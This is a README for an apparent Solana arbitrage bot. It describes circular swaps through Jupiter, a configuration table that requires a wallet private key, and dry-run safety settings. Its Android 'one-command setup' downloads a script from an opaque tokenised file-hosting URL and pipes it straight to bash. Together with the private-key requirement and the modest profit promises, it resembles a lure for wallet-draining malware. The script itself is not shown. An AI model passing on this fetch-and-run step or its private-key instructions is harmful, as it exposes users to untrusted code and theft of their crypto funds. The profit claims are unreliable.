# Solana Arbitrage Bot

Automated cross-DEX circular arbitrage bot for Solana, targeting $0.20 profit per trade, up to 3 trades per day.

## Strategy
Scans Jupiter for circular arbitrage opportunities every 5 seconds:
- SOL → USDC → SOL
- SOL → USDT → SOL
- SOL → BONK → SOL

Only executes when profit after fees exceeds `MIN_PROFIT_USD` (default $0.20).

## Requirements
- Node.js 18+ (or Bun)
- ~$10–15 SOL starting balance
- Free [Helius RPC](https://helius.dev) key (recommended)

## Quick Start (Termux / Android)

Run the one-command setup:
```bash
URL=https://surething.io/api/files/b18a1ac6-3e01-4f6f-bb78-f2d5de3a8d9c/download?t=ZgYjzHKX_pc71r4VmeRo0A.1780528716
curl -gL "$URL" -o setup.sh && bash setup.sh
```

Then start:
```bash
cd ~/arb-bot && node bot.js
```

## Quick Start (Desktop)
```bash
git clone https://github.com/businessventure372-glitch/solana-arb-bot
cd solana-arb-bot
npm install
cp .env.example .env
# Edit .env with your PRIVATE_KEY and RPC_URL
npx ts-node src/arb-bot.ts
```

## Configuration (.env)

| Variable | Default | Description |
|---|---|---|
| `PRIVATE_KEY` | required | Base58 wallet private key |
| `RPC_URL` | public mainnet | Helius/Quicknode RPC URL |
| `MAX_DAILY_TRADES` | 3 | Max trades per 24 hours |
| `MIN_PROFIT_USD` | 0.20 | Minimum profit threshold per trade |
| `TRADE_SIZE_PCT` | 80 | % of balance used per trade |
| `MAX_DAILY_LOSS_PCT` | 5 | Daily loss circuit breaker |
| `SLIPPAGE_BPS` | 50 | Max slippage (0.5%) |
| `DRY_RUN` | true | Simulate without executing |

## Safety
- **Start in dry run** (`DRY_RUN=true`) — no real trades, see opportunities logged
- Switch to live: set `DRY_RUN=false` in `.env`
- Daily loss limit halts trading automatically
- Emergency stop: `Ctrl+C`

## Based on
[AI Arbitrage Trading System Specifications](https://github.com/businessventure372-glitch/arbitragepro)

## Disclaimer
Trading involves risk. Never trade more than you can afford to lose. This software is provided as-is with no warranty.
